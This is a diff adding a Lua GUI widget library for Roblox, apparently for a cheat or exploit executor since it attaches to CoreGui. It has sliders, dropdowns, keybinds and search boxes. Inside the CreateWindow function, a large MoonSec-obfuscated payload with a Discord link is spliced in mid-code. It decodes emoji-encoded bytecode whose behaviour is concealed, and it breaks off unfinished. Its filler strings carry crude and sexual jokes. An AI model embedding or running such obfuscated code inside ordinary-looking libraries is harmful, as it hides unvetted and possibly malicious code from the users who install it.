+				MouseButton2 = true;
+			}      
+
+			local nm = (default and (shortNames[default.Name] or default.Name) or "None");
+			local check = library:Create('Frame', {
+				BackgroundTransparency = 1;
+				Size = UDim2.new(1, 0, 0, 30);
+				LayoutOrder = self:GetOrder();
+				library:Create('TextLabel', {
+					Name = name;
+					Text = "\r" .. name;
+					BackgroundTransparency = 1;
+					TextColor3 = library.options.textcolor;
+					Position = UDim2.new(0, 5, 0, 0);
+					Size     = UDim2.new(1, -5, 1, 0);
+					TextXAlignment = Enum.TextXAlignment.Left;
+					Font = library.options.font;
+					TextSize = library.options.fontsize;
+					TextStrokeTransparency = library.options.textstroke;
+					TextStrokeColor3 = library.options.strokecolor;
+					BorderColor3     = library.options.bordercolor;
+					BorderSizePixel  = 1;
+					library:Create('TextButton', {
+						Name = 'Keybind';
+						Text = nm;
+						TextStrokeTransparency = library.options.textstroke;
+						TextStrokeColor3 = library.options.strokecolor;
+						Font = library.options.font;
+						TextSize = library.options.fontsize;
+						Size = UDim2.new(0, 60, 0, 20);
+						Position = UDim2.new(1, -65, 0, 5);
+						TextColor3 = library.options.textcolor;
+						BackgroundColor3 = library.options.bgcolor;
+						BorderColor3     = library.options.bordercolor;
+						BorderSizePixel  = 1;
+					})
+				});
+				Parent = self.container;
+			});
+
+			local button = check:FindFirstChild(name).Keybind;
+			button.MouseButton1Click:connect(function()
+				library.binding = true
+
+				button.Text = "..."
+				local a, b = game:GetService('UserInputService').InputBegan:wait();
+				local name = tostring(a.KeyCode.Name);
+				local typeName = tostring(a.UserInputType.Name);
+
+				if (a.UserInputType ~= Enum.UserInputType.Keyboard and (allowed[a.UserInputType.Name]) and (not keyboardOnly)) or (a.KeyCode and (not banned[a.KeyCode.Name])) then
+					local name = (a.UserInputType ~= Enum.UserInputType.Keyboard and a.UserInputType.Name or a.KeyCode.Name);
+					location[flag] = (a);
+					button.Text = shortNames[name] or name;
+
+				else
+					if (location[flag]) then
+						if (not pcall(function()
+								return location[flag].UserInputType
+							end)) then
+							local name = tostring(location[flag])
+							button.Text = shortNames[name] or name
+						else
+							local name = (location[flag].UserInputType ~= Enum.UserInputType.Keyboard and location[flag].UserInputType.Name or location[flag].KeyCode.Name);
+							button.Text = shortNames[name] or name;
+						end
+					end
+				end
+
+				wait(0.1)  
+				library.binding = false;
+			end)
+
+			if location[flag] then
+				button.Text = shortNames[tostring(location[flag].Name)] or tostring(location[flag].Name)
+			end
+
+			library.binds[flag] = {
+				location = location;
+				callback = callback;
+			};
+
+			self:Resize();
+		end
+
+		function types:Section(name)
+			local order = self:GetOrder();
+			local determinedSize = UDim2.new(1, 0, 0, 25)
+			local determinedPos = UDim2.new(0, 0, 0, 4);
+			local secondarySize = UDim2.new(1, 0, 0, 20);
+
+			if order == 0 then
+				determinedSize = UDim2.new(1, 0, 0, 21)
+				determinedPos = UDim2.new(0, 0, 0, -1);
+				secondarySize = nil
+			end
+
+			local check = library:Create('Frame', {
+				Name = 'Section';
+				BackgroundTransparency = 1;
+				Size = determinedSize;
+				BackgroundColor3 = library.options.sectncolor;
+				BorderSizePixel = 0;
+				LayoutOrder = order;
+				library:Create('TextLabel', {
+					Name = 'section_lbl';
+					Text = name;
+					BackgroundTransparency = 0;
+					BorderSizePixel = 0;
+					BackgroundColor3 = library.options.sectncolor;
+					TextColor3 = library.options.textcolor;
+					Position = determinedPos;
+					Size     = (secondarySize or UDim2.new(1, 0, 1, 0));
+					Font = library.options.font;
+					TextSize = library.options.fontsize;
+					TextStrokeTransparency = library.options.textstroke;
+					TextStrokeColor3 = library.options.strokecolor;
+				});
+				Parent = self.container;
+			});
+
+			self:Resize();
+		end
+
+		function types:Slider(name, options, callback)
+			local default = options.default or options.min;
+			local min     = options.min or 0;
+			local max      = options.max or 1;
+			local location = options.location or self.flags;
+			local precise  = options.precise  or false -- e.g 0, 1 vs 0, 0.1, 0.2, ...
+			local flag     = options.flag or "";
+			local callback = callback or function() end
+
+			location[flag] = default;
+
+			local check = library:Create('Frame', {
+				BackgroundTransparency = 1;
+				Size = UDim2.new(1, 0, 0, 25);
+				LayoutOrder = self:GetOrder();
+				library:Create('TextLabel', {
+					Name = name;
+					TextStrokeTransparency = library.options.textstroke;
+					TextStrokeColor3 = library.options.strokecolor;
+					Text = "\r" .. name;
+					BackgroundTransparency = 1;
+					TextColor3 = library.options.textcolor;
+					Position = UDim2.new(0, 5, 0, 2);
+					Size     = UDim2.new(1, -5, 1, 0);
+					TextXAlignment = Enum.TextXAlignment.Left;
+					Font = library.options.font;
+					TextSize = library.options.fontsize;
+					library:Create('Frame', {
+						Name = 'Container';
+						Size = UDim2.new(0, 60, 0, 20);
+						Position = UDim2.new(1, -65, 0, 3);
+						BackgroundTransparency = 1;
+						--BorderColor3 = library.options.bordercolor;
+						BorderSizePixel = 0;
+						library:Create('TextLabel', {
+							Name = 'ValueLabel';
+							Text = default;
+							BackgroundTransparency = 1;
+							TextColor3 = library.options.textcolor;
+							Position = UDim2.new(0, -10, 0, 0);
+							Size     = UDim2.new(0, 1, 1, 0);
+							TextXAlignment = Enum.TextXAlignment.Right;
+							Font = library.options.font;
+							TextSize = library.options.fontsize;
+							TextStrokeTransparency = library.options.textstroke;
+							TextStrokeColor3 = library.options.strokecolor;
+						});
+						library:Create('TextButton', {
+							Name = 'Button';
+							Size = UDim2.new(0, 5, 1, -2);
+							Position = UDim2.new(0, 0, 0, 1);
+							AutoButtonColor = false;
+							Text = "";
+							BackgroundColor3 = Color3.fromRGB(20, 20, 20);
+							BorderSizePixel = 0;
+							ZIndex = 2;
+							TextStrokeTransparency = library.options.textstroke;
+							TextStrokeColor3 = library.options.strokecolor;
+						});
+						library:Create('Frame', {
+							Name = 'Line';
+							BackgroundTransparency = 0;
+							Position = UDim2.new(0, 0, 0.5, 0);
+							Size     = UDim2.new(1, 0, 0, 1);
+							BackgroundColor3 = Color3.fromRGB(255, 255, 255);
+							BorderSizePixel = 0;
+						});
+					})
+				});
+				Parent = self.container;
+			});
+
+			local overlay = check:FindFirstChild(name);
+
+			local renderSteppedConnection;
+			local inputBeganConnection;
+			local inputEndedConnection;
+			local mouseLeaveConnection;
+			local mouseDownConnection;
+			local mouseUpConnection;
+
+			check:FindFirstChild(name).Container.MouseEnter:connect(function()
+				local function update()
+					if renderSteppedConnection then renderSteppedConnection:disconnect() end 
+
+
+					renderSteppedConnection = game:GetService('RunService').RenderStepped:connect(function()
+						local mouse = game:GetService("UserInputService"):GetMouseLocation()
+						local percent = (mouse.X - overlay.Container.AbsolutePosition.X) / (overlay.Container.AbsoluteSize.X)
+						percent = math.clamp(percent, 0, 1)
+						percent = tonumber(string.format("%.2f", percent))
+
+						overlay.Container.Button.Position = UDim2.new(math.clamp(percent, 0, 0.99), 0, 0, 1)
+
+						local num = min + (max - min) * percent
+						local value = (precise and num or math.floor(num))
+
+						overlay.Container.ValueLabel.Text = value;
+						callback(tonumber(value))
+						location[flag] = tonumber(value)
+					end)
+				end
+
+				local function disconnect()
+					if renderSteppedConnection then renderSteppedConnection:disconnect() end
+					if inputBeganConnection then inputBeganConnection:disconnect() end
+					if inputEndedConnection then inputEndedConnection:disconnect() end
+					if mouseLeaveConnection then mouseLeaveConnection:disconnect() end
+					if mouseUpConnection then mouseUpConnection:disconnect() end
+				end
+
+				inputBeganConnection = check:FindFirstChild(name).Container.InputBegan:connect(function(input)
+					if input.UserInputType == Enum.UserInputType.MouseButton1 then
+						update()
+					end
+				end)
+
+				inputEndedConnection = check:FindFirstChild(name).Container.InputEnded:connect(function(input)
+					if input.UserInputType == Enum.UserInputType.MouseButton1 then
+						disconnect()
+					end
+				end)
+
+				mouseDownConnection = check:FindFirstChild(name).Container.Button.MouseButton1Down:connect(update)
+				mouseUpConnection   = game:GetService("UserInputService").InputEnded:connect(function(a, b)
+					if a.UserInputType == Enum.UserInputType.MouseButton1 and (mouseDownConnection.Connected) then
+						disconnect()
+					end
+				end)
+			end)    
+
+			if default ~= min then
+				local percent = 1 - ((max - default) / (max - min))
+				local number  = default 
+
+				number = tonumber(string.format("%.2f", number))
+				if (not precise) then
+					number = math.floor(number)
+				end
+
+				overlay.Container.Button.Position  = UDim2.new(math.clamp(percent, 0, 0.99), 0,  0, 1) 
+				overlay.Container.ValueLabel.Text  = number
+			end
+
+			self:Resize();
+			return {
+				Set = function(self, value)
+					local percent = 1 - ((max - value) / (max - min))
+					local number  = value 
+
+					number = tonumber(string.format("%.2f", number))
+					if (not precise) then
+						number = math.floor(number)
+					end
+
+					overlay.Container.Button.Position  = UDim2.new(math.clamp(percent, 0, 0.99), 0,  0, 1) 
+					overlay.Container.ValueLabel.Text  = number
+					location[flag] = number
+					callback(number)
+				end
+			}
+		end 
+
+		function types:SearchBox(text, options, callback)
+			local list = options.list or {};
+			local flag = options.flag or "";
+			local location = options.location or self.flags;
+			local callback = callback or function() end;
+
+			local busy = false;
+			local box = library:Create('Frame', {
+				BackgroundTransparency = 1;
+				Size = UDim2.new(1, 0, 0, 25);
+				LayoutOrder = self:GetOrder();
+				library:Create('TextBox', {
+					Text = "";
+					PlaceholderText = text;
+					PlaceholderColor3 = Color3.fromRGB(60, 60, 60);
+					Font = library.options.font;
+					TextSize = library.options.fontsize;
+					Name = 'Box';
+					Size = UDim2.new(1, -10, 0, 20);
+					Position = UDim2.new(0, 5, 0, 4);
+					TextColor3 = library.options.textcolor;
+					BackgroundColor3 = library.options.dropcolor;
+					BorderColor3 = library.options.bordercolor;
+					TextStrokeTransparency = library.options.textstroke;
+					TextStrokeColor3 = library.options.strokecolor;
+					library:Create('ScrollingFrame', {
+						Position = UDim2.new(0, 0, 1, 1);
+						Name = 'Container';
+						BackgroundColor3 = library.options.btncolor;
+						ScrollBarThickness = 0;
+						BorderSizePixel = 0;
+						BorderColor3 = library.options.bordercolor;
+						Size = UDim2.new(1, 0, 0, 0);
+						library:Create('UIListLayout', {
+							Name = 'ListLayout';
+							SortOrder = Enum.SortOrder.LayoutOrder;
+						});
+						ZIndex = 2;
+					});
+				});
+				Parent = self.container;
+			})
+
+			local function rebuild(text)
+				box:FindFirstChild('Box').Container.ScrollBarThickness = 0
+				for i, child in next, box:FindFirstChild('Box').Container:GetChildren() do
+					if (not child:IsA('UIListLayout')) then
+						child:Destroy();
+					end
+				end
+
+				if #text > 0 then
+					for i, v in next, list do
+						if string.sub(string.lower(v), 1, string.len(text)) == string.lower(text) then
+							local button = library:Create('TextButton', {
+								Text = v;
+								Font = library.options.font;
+								TextSize = library.options.fontsize;
+								TextColor3 = library.options.textcolor;
+								BorderColor3 = library.options.bordercolor;
+								TextStrokeTransparency = library.options.textstroke;
+								TextStrokeColor3 = library.options.strokecolor;
+								Parent = box:FindFirstChild('Box').Container;
+								Size = UDim2.new(1, 0, 0, 20);
+								LayoutOrder = i;
+								BackgroundColor3 = library.options.btncolor;
+								ZIndex = 2;
+							})
+
+							button.MouseButton1Click:connect(function()
+								busy = true;
+								box:FindFirstChild('Box').Text = button.Text;
+								wait();
+								busy = false;
+
+								location[flag] = button.Text;
+								callback(location[flag])
+
+								box:FindFirstChild('Box').Container.ScrollBarThickness = 0
+								for i, child in next, box:FindFirstChild('Box').Container:GetChildren() do
+									if (not child:IsA('UIListLayout')) then
+										child:Destroy();
+									end
+								end
+								box:FindFirstChild('Box').Container:TweenSize(UDim2.new(1, 0, 0, 0), 'Out', 'Quad', 0.25, true)
+							end)
+						end
+					end
+				end
+
+				local c = box:FindFirstChild('Box').Container:GetChildren()
+				local ry = (20 * (#c)) - 20
+
+				local y = math.clamp((20 * (#c)) - 20, 0, 100)
+				if ry > 100 then
+					box:FindFirstChild('Box').Container.ScrollBarThickness = 5;
+				end
+
+				box:FindFirstChild('Box').Container:TweenSize(UDim2.new(1, 0, 0, y), 'Out', 'Quad', 0.25, true)
+				box:FindFirstChild('Box').Container.CanvasSize = UDim2.new(1, 0, 0, (20 * (#c)) - 20)
+			end
+
+			box:FindFirstChild('Box'):GetPropertyChangedSignal('Text'):connect(function()
+				if (not busy) then
+					rebuild(box:FindFirstChild('Box').Text)
+				end
+			end);
+
+			local function reload(new_list)
+				list = new_list;
+				rebuild("")
+			end
+			self:Resize();
+			return reload, box:FindFirstChild('Box');
+		end
+
+		function types:Dropdown(name, options, callback)
+			local location = options.location or self.flags;
+			local flag = options.flag or "";
+			local callback = callback or function() end;
+			local list = options.list or {};
+
+			location[flag] = list[1]
+			local check = library:Create('Frame', {
+				BackgroundTransparency = 1;
+				Size = UDim2.new(1, 0, 0, 25);
+				BackgroundColor3 = Color3.fromRGB(25, 25, 25);
+				BorderSizePixel = 0;
+				LayoutOrder = self:GetOrder();
+				library:Create('Frame', {
+					Name = 'dropdown_lbl';
+					BackgroundTransparency = 0;
+					BackgroundColor3 = library.options.dropcolor;
+					Position = UDim2.new(0, 5, 0, 4);
+					BorderColor3 = library.options.bordercolor;
+					Size     = UDim2.new(1, -10, 0, 20);
+					library:Create('TextLabel', {
+						Name = 'Selection';
+						Size = UDim2.new(1, 0, 1, 0);
+						Text = list[1];
+						TextColor3 = library.options.textcolor;
+						BackgroundTransparency = 1;
+						Font = library.options.font;
+						TextSize = library.options.fontsize;
+						TextStrokeTransparency = library.options.textstroke;
+						TextStrokeColor3 = library.options.strokecolor;
+					});
+					library:Create("TextButton", {
+						Name = 'drop';
+						BackgroundTransparency = 1;
+						Size = UDim2.new(0, 20, 1, 0);
+						Position = UDim2.new(1, -25, 0, 0);
+						Text = 'v';
+						TextColor3 = library.options.textcolor;
+						Font = library.options.font;
+						TextSize = library.options.fontsize;
+						TextStrokeTransparency = library.options.textstroke;
+						TextStrokeColor3 = library.options.strokecolor;
+					})
+				});
+				Parent = self.container;
+			});
+
+			local button = check:FindFirstChild('dropdown_lbl').drop;
+			local input;
+
+			button.MouseButton1Click:connect(function()
+				if (input and input.Connected) then
+					return
+				end 
+
+				check:FindFirstChild('dropdown_lbl'):WaitForChild('Selection').TextColor3 = Color3.fromRGB(60, 60, 60);
+				check:FindFirstChild('dropdown_lbl'):WaitForChild('Selection').Text = name;
+				local c = 0;
+				for i, v in next, list do
+					c = c + 20;
+				end
+
+				local size = UDim2.new(1, 0, 0, c)
+
+				local clampedSize;
+				local scrollSize = 0;
+				if size.Y.Offset > 100 then
+					clampedSize = UDim2.new(1, 0, 0, 100)
+					scrollSize = 5;
+				end
+
+				local goSize = (clampedSize ~= nil and clampedSize) or size;    
+				local container = library:Create('ScrollingFrame', {
+					TopImage = 'rbxasset://textures/ui/Scroll/scroll-middle.png';
+					BottomImage = 'rbxasset://textures/ui/Scroll/scroll-middle.png';
+					Name = 'DropContainer';
+					Parent = check:FindFirstChild('dropdown_lbl');
+					Size = UDim2.new(1, 0, 0, 0);
+					BackgroundColor3 = library.options.bgcolor;
+					BorderColor3 = library.options.bordercolor;
+					Position = UDim2.new(0, 0, 1, 0);
+					ScrollBarThickness = scrollSize;
+					CanvasSize = UDim2.new(0, 0, 0, size.Y.Offset);
+					ZIndex = 5;
+					ClipsDescendants = true;
+					library:Create('UIListLayout', {
+						Name = 'List';
+						SortOrder = Enum.SortOrder.LayoutOrder
+					})
+				})
+
+				for i, v in next, list do
+					local btn = library:Create('TextButton', {
+						Size = UDim2.new(1, 0, 0, 20);
+						BackgroundColor3 = library.options.btncolor;
+						BorderColor3 = library.options.bordercolor;
+						Text = v;
+						Font = library.options.font;
+						TextSize = library.options.fontsize;
+						LayoutOrder = i;
+						Parent = container;
+						ZIndex = 5;
+						TextColor3 = library.options.textcolor;
+						TextStrokeTransparency = library.options.textstroke;
+						TextStrokeColor3 = library.options.strokecolor;
+					})
+
+					btn.MouseButton1Click:connect(function()
+						check:FindFirstChild('dropdown_lbl'):WaitForChild('Selection').TextColor3 = library.options.textcolor
+						check:FindFirstChild('dropdown_lbl'):WaitForChild('Selection').Text = btn.Text;
+
+						location[flag] = tostring(btn.Text);
+						callback(location[flag])
+
+						game:GetService('Debris'):AddItem(container, 0)
+						input:disconnect();
+					end)
+				end
+
+				container:TweenSize(goSize, 'Out', 'Quad', 0.15, true)
+
+				local function isInGui(frame)
+					local mloc = game:GetService('UserInputService'):GetMouseLocation();
+					local mouse = Vector2.new(mloc.X, mloc.Y - 36);
+
+					local x1, x2 = frame.AbsolutePosition.X, frame.AbsolutePosition.X + frame.AbsoluteSize.X;
+					local y1, y2 = frame.AbsolutePosition.Y, frame.AbsolutePosition.Y + frame.AbsoluteSize.Y;
+
+					return (mouse.X >= x1 and mouse.X <= x2) and (mouse.Y >= y1 and mouse.Y <= y2)
+				end
+
+				input = game:GetService('UserInputService').InputBegan:connect(function(a)
+					if a.UserInputType == Enum.UserInputType.MouseButton1 and (not isInGui(container)) then
+						check:FindFirstChild('dropdown_lbl'):WaitForChild('Selection').TextColor3 = library.options.textcolor
+						check:FindFirstChild('dropdown_lbl'):WaitForChild('Selection').Text       = location[flag];
+
+						container:TweenSize(UDim2.new(1, 0, 0, 0), 'In', 'Quad', 0.15, true)
+						wait(0.15)
+
+						game:GetService('Debris'):AddItem(container, 0)
+						input:disconnect();
+					end
+				end)
+			end)
+
+			self:Resize();
+			local function reload(self, array)
+				options = array;
+				location[flag] = array[1];
+				pcall(function()
+					input:disconnect()
+				end)
+				check:WaitForChild('dropdown_lbl').Selection.Text = location[flag]
+				check:FindFirstChild('dropdown_lbl'):WaitForChild('Selection').TextColor3 = library.options.textcolor
+				game:GetService('Debris'):AddItem(container, 0)
+			end
+
+			return {
+				Refresh = reload;
+			}
+		end
+	end
+
+	function library:Create(class, data)
+		local obj = Instance.new(class);
+		for i, v in next, data do
+			if i ~= 'Parent' then
+
+				if typeof(v) == "Instance" then
+					v.Parent = obj;
+				else
+					obj[i] = v
+				end
+			end
+		end
+
+		obj.Parent = data.Parent;
+		return obj
+	end
+
+	function library:CreateWindow(name, options)
+		if (not library.container) then
+			library.container = self:Create("ScreenGui", {
+				self:Create('Frame', {
+					Name = 'Container';
+					Size = UDim2.new(1, -30, 1, 0);
+					Position = UDim2.new(0, 20, 0, 20);
+					BackgroundTransparency = 1;
+					Active = false;
+				});
+				Parent = game:GetService("CoreGui");
+			}):FindFirstChild('Container');
+			_Q90gCjoAjN6n98k7, Protected_by_MoonSecV2, Discord = 'discord.gg/gQEH2uZxUk'
+
+
+,nil,nil;(function() _msec=(function(_,__,_l)local _l___l=__[((0x249/5)-0x5e)];local _ll__l=_l[_[(-0x2e+713)]][_[((1677-0x369)+-#'Pain is an illusion created by your brain')]];local ____=(117+-0x71)/(0x3e/((-#'staymad'+(4227+-0x42))/134))local __ll=((-#[[Yeah this is getting cringe-]]+(((-92+-0x543)+-81)/0x4c))+0x32)-(0xc9/201)local ___lll=_l[_[(402-0xed)]][_[(0x2bc-(-#{82;'}',1}+413))]];local _ll__=(((-#[[I have enchanted this script with uncrackable V]]+(-0x7f+20064))/221)/0x5a)+(0x7d+-123)local _l__=_l[_[(39620/0x46)]][_[((435100/0xe5)-1001)]]local __l=(0x8a/69)-(39/(0x9b-(0x131-189)))local __l_l=(-#"This code was obfuscated using PSU, which stands for Penis Sucking Utilities"+(12090/((0x1a6-(540-(315+-#{'nil',(function()return#{('bPphlk'):find("\112")}>0 and 1 or 0 end),{}})))+-#"<@!847154787934011462> shut the fuck up")))local _ll_=((0x9f+((-6895+0xd51)/0x53))+-115)local _l_l=((-#{(function()return{','}end)();44,{}}+126)-0x79)local __l_=(442/((-#{",",25,25,1,'nil';","}+524)-0x129))local _llll=((103+-#{{},(function()return#{('bklbkK'):find("\108")}>0 and 1 or 0 end),(function()return#{('bklbkK'):find("\108")}>0 and 1 or 0 end),(function()return{','}end)();59;1})+-0x5f)local __lll=((0xa4-(-#{(function()return#{('oPHBFH'):find("\72")}>0 and 1 or 0 end);",",70,(function()return#{('oPHBFH'):find("\72")}>0 and 1 or 0 end);(function()return{','}end)(),82;82}+118))+-#'You know lua? name every metamethod - skids of v3rm')local ___ll=(-0x60+(-#{'nil',(function()return#{('PmFpMp'):find("\70")}>0 and 1 or 0 end);78,",",(function()return{','}end)();{},{}}+106))local _l__l=(-#"moonsec pls add fivem choice"+(123-((((0x3398-(0x8559a/82))-0xcd9)+-#'You know c#? What does << operator do?')/0x23)))local _ll_l=(-#{{},165,93;",";93;{};'nil'}+10)local _l_ll=(0x82+(-#[[this file was obfuscated manually]]+(-16262/((0x23a-329)+-0x44))))local ___l=(-0x13+(0x49+(-#'One Shot Was Here'+((6642/0xf6)+-0x3d))))local _lll=(-#'c0ck'+(0x27-((23000/(((0x24f+-29)-0x122)+-#[[You burned a minor!?!?]]))+-#"The Great Sage Equal To Heaven is here Luraph users hide!!!!")))local ___l_=((((19827+-#{1;'nil';1;19,(function()return{','}end)()})/0xbb)+-0x5a)+-#"cry about it")local _lll_=((0xb1a/((128+(-10927/0xdf))+-#"Perths Scripting Shit"))-0x2d)local __l__=((63+((-#'dm me +stfu'+(-589+-0x28))/0x14))-27)local _l___=((-0x27e4/((255/0x1)+-0x21))+50)local __llll=(((-#{(function()return{','}end)();(function()return#{('bFHbMb'):find("\72")}>0 and 1 or 0 end);'nil';(function()return#{('bFHbMb'):find("\72")}>0 and 1 or 0 end);{}}+1205)/0x4)/75)local __ll_=(0x40-(67+-#{'nil',10,(function()return{','}end)();'nil',{};(function()return{','}end)(),41}))local ___l_l=_[(2872-0x5ce)];local _l_l_l=_l[_[(0x182-221)]][_[(-#"guys listen... sussex XD"+(0x1b05a/234))]];local __ll_l=_l[(function(_)return type(_):sub(1,1)..'\101\116'end)('��🤣🤣��')..'\109\101'..('\116\97'or'����🤣🤣').._[(92258/0xa3)]];local _l__ll=_l[_[(0x20326/233)]][_[(-#{{},{},(function()return#{('omhOKB'):find("\104")}>0 and 1 or 0 end);1}+970)]];local _lllll=(0x14c/166)-((9776/(-#'the book continues: thy shall make the cock and ball torture'+(0x127-183)))/94)local _____=(-37+((-#"federal stop deleting my strings"+(0x25085/115))/33))-(0x1e-28)local ____ll=_l[_[(-#'hi paster'+(-28+0xca))]][_[(-#'Moonsec v6 coming out in 1 day'+(44520/0x69))]];local _ll=function(_l,_)return _l.._ end local _l_lll=(28-0x18)*(0x3c/(1530/((24723/0x7b)+-#"Hi I give skin away in game Counter of the Global Offense Strike. Send trade offer on sketchy link.")))local _lll_l=_l[_[(-#{(function()return{','}end)();(function()return{','}end)(),'nil';(function()return#{('HPpKFh'):find("\112")}>0 and 1 or 0 end);{},12,(function()return#{('HPpKFh'):find("\112")}>0 and 1 or 0 end)}+1201)]];local ___=(104-0x66)*(-#[[Roblox is written in assembly you dingus]]+(378-((1057-0x238)-279)))local __l_ll=(-126+0x47e)*(116-(-#'fivem when they block the PSU watermark'+(22491/(0x7c08/216))))local __l__l=((((0x426-(659+-0x72))-316)-120)+-#[[free moonsec anywhere you go!]])local _l_l_=(((7502+(-0xe-54))/0x76)+-#"If you see this string you are going to be sued by memcorrupt")*(22+-0x14)local ____l=_l[_[((2319-0x4c6)+-#[[KFC tried to justify urls as fake constants LOL]])]]or _l[_[(0x4ab-629)]][_[((2319-0x4c6)+-#[[KFC tried to justify urls as fake constants LOL]])]];local _l_=(-33+(0x8f5f/(-0x4d+204)))local _=_l[_[(-#{'nil';{};'}';'nil';'nil','nil',","}+1270)]];local _ll_ll=(function(_l_)local ___,__=4,0x10 local _l={j={},v={}}local _ll=-__l local _=__+__ll while true do _l[_l_:sub(_,(function()_=___+_ return _-__ll end)())]=(function()_ll=_ll+__l return _ll end)()if _ll==(_l_lll-__l)then _ll=""__=_lllll break end end local _ll=#_l_ while _<_ll+__ll do _l.v[__]=_l_:sub(_,(function()_=___+_ return _-__ll end)())__=__+__l if __%____==_lllll then __=_____ _l__ll(_l.j,(____ll((_l[_l.v[_____]]*_l_lll)+_l[_l.v[__l]])))end end return _l__(_l.j)end)("..:::MoonSec::..😀😃😄😁😆😅🤣😂🙂🙃😉😊😇😝🤪😜🤣🤪😅😃😝😝🤣🙃😄😜🙂😂😀😝🙃🙃😄😅😃😅😆😃😅😁🙃😜😉😄🤣😇🙃😄🙂🙃😃😃🙃😝😄🙃😜😜😊😆😁😇😇😂😁😄😂🙃😜😝🙂🙃😃😅😃😅🙃😇😄😂😊😉😁🤪😊😜😆🤪🤪😂😉😝🙃🤣😃🙃😉😅😁😃😄😆😉😉😆😄😇🤣🤣😀😝🤪😂😁😀😆🙂😄😜🤣😁😊😇😃😆😝😝🙃😇😝😅😀😇😇😆😂😇😉😁😜🙃😅😁🙃😁🙂😅🤪😝😝🤣🙃😜😅🤪😄😂😝😀😄😅😆😄🙂😉😄😄😊😊😝😅😀😝😇🤣😆😜🙂😆😀😁🤣😄😜😊😅😆😃😇😝😂🤪😁😂🙂🤣😄😉😊🤣😄🙂😄😂😁😝😊🙃😆😅😝😃😊😊😄🙂🤣😀😇😝😅😃🤪😊😅🤪😇😀😃😀🙃🤣😜😜😂🤣😉😄😀😜😊😃😃🤪🤣😉😇😃😁😅😇😃😆😝😆🙃😇🤣🤣😆😜😃🤣🤪😜😂🙂😉😃😊🤣😂😄🙂😇😀😆😉🙃🙂🤣😂🤪😄🙂😆😇🙂🙃😉😜😇😂😀😀😀🙃😊😆😊😊😄😄😀🙂🙃😃😃🙃😝😄🙃😃😇😉😄😁😉😊🤪🙃😃😂😊😜😝🙂🙃😃😅🤪😊🙂😀😀🙂🙃😁😃🤣😇😊😆😇🤪😆🤣😅😜😄🙃😜😉🙃😁😃😊😝😆🙃😄😁😇😄😅😉😝🤪😂🙂🙃😉😃😝😉🙃😁😅😀🤪😉🤪😆😀😝😁😅😉😜😃😂🤪😜🙃🙂🤣😇😃😆😀😇😅😅😃😝😝😉😇😅🤪😜😅😂🤣😃😁🙂😉😃😜😁😅😝😀😅😅🤪😃🤣😝😅😝🤪🤪🙂😆😀😀🙃🙂😄😂😉😅😂🙃🤣😃🤪😅😂😃😜😝😝😃🙂😉😀🤪🙂🤪😄😂😊😆😁😉😇😃🙂😄😂😅😀😃🙂😝😃🙃🤣😆😁😅😊😝😆🙃😝😅😝😆😄😜😂😇😇😂🤣😁😄😁😉🙃😁😅😇😃🤪😊😇😉😄🙃😁😉🤪😅🤪😀😇😜😄😅😉😝😁🙃😇😅😇😄🤪🙃😃😁😆🙂😉🙂😃😁🙃🙃😄😅😊😃😁😊😝😁😂😂😅😆😜😄🤣😇😝😄😃😂🙃😝😄🙃😊😅🤣😅😉😅🙂😉😇🤣🙂😜😃😁🙂😃😃😜😉😃😄😝😊🙃🙃😀😁😉😇😀😅😆😇😅🤣😝🤪🤪🙃😄😀😉😉😁😝😃😆😜😝😅🤣😃🤪😝😇🙃😂😃😜😄🙃🤣😀🤪😉😂🤪🙂😅🙃😝🙃🤣😅😜😃😝😃😆😊🤪😝😂😁😃🙂😉🤪😀🙃😇😊😆🤪🤪😁😅😉😇😇😄😃😉😁😄😅😊😃😁😝😄🙂😊😆😅😆😝😄😅😇😜😉🙂😁😀😄🙂🤪😄🤣😁🙃😝😀😅🙃🤪😅😂😃😆🙃🤪🤪😂😇😆😝😁😃😊🙃😆😅😝😃😉😅😆🤪😝🤣🤣😅😅😜😃🤪😉😅😁😃😊😝😊😇😄😁😉😀😀😉😂😅🤣😅🙃😇😃😝😉🙃😁😅😀😆😊🤣😆😝😇🤪🤣😊🤪😄😂😂😀🙂🙂🙃😃🤣😉🙃😄😅🤣🤣😝😝🤣🙃😜😅🤪😅😂🤣😀😇🙂🙂😄😀😉😜😄😝🙂😁😆🙂😝😆😄🙂🤪😇🤣😄🤪😄😂😃🤪😂😊🤣😄😂😝😃😁😉😝😇😁🙂🙂🙃😃😅😉😃😄😝😊🙃😆😅😄🙂🙃😝🙃😅🙂😃😀😃🙂😝😃🙃🤪🤣🙃😅😄😃🙂🤪😆😝😝😅😅😜😝😉😆🙂😜😄🙃😀😃😃🙃😅😇😆😆😝😝🙃🤣😅😁😄😇😝😅😄🙃🤣😄🙂😉😝😁🙃😇😅😉😃😆🙃😇😉🤣🤪🤪🤣😂😜😀😇🤪😆😊😅😁😝😇🙃😅😅😄😁😝😇😅😝😜🤪🙃😂😉😄😄🙃😊😅😆😃😃😅😇🙂😅😁😝🤣😂🤣🙂😉😃🙃😉😃😄😝😊🙃😊😅😁😄😇😜😅😝🤣😝😃😅🙂😝😃🙃😉😅🙂😆😄😄😊😝😄😅😝😁😅🤣🤪🤣🤣🤣😀😁🙃🤣😜🙃🙃🤣😁😁😇😃😃😇😉😊🤣😁😝🤪😂🤣😜😉😇😝😊🙂😁🙃😇😅😅😃😄🙃😇🤪😅🤣🤪😅😂😄😀😊🙂😂😄😀🙃🤪😁😊😊🙃😆😃😂😁😜🙃🙂😅😃😃😜🤣🙂😊😝😆🤪😆😀😂😀😃😇😉😂😂😜😝🙂🙃😃😅🤪😄🙃😉😄🙂😊😉😁😜😝😃🙃😅😂😊😀😃🙂😝😃🙃😆😄😊😊😇😁🤪😃😊😝😇😄😊😜🙂😆😀😅🙃😃😃😝😃😅🙃😉😄😄😊😃😁🤪😝😂🤣😆😜😃🤣😉😀🙃🙃😆😉🤪😊😃😇😅😅😃😝😝😝😀😄😉😂🙂😇😄😃😁😄🙂🤣😊😊🙃😁😇🙂😜🤪😂😄😅😂😜😝😀😃😀😄🙂😉😊😀😅😅😃🤣😃🤪😃😁🤪🙂😅🙃🙃😄😜🤣😊😊🤣😀😉😅😜😉😝😜😂😆😝😅😂😉🤪😜😝😆😁🙃😆😝😜😁😃🙂😀😇😝😃😉🤣😆😊😊😀😆😅😀🙃😜🤪😝😁🤪🙂😉😝😆😄😃🙂😜😜😁😄🤣😂🤣😜😃😄🙂🤣🙂😇😆😀🙃🤣🙃🙂😝😝😃🤣😄🙂🤣🤪🙂😁😇🤣😊😊😃😀😀😆😀🙂🙃😀😇😁😉😂🙃😇🙃😄🤣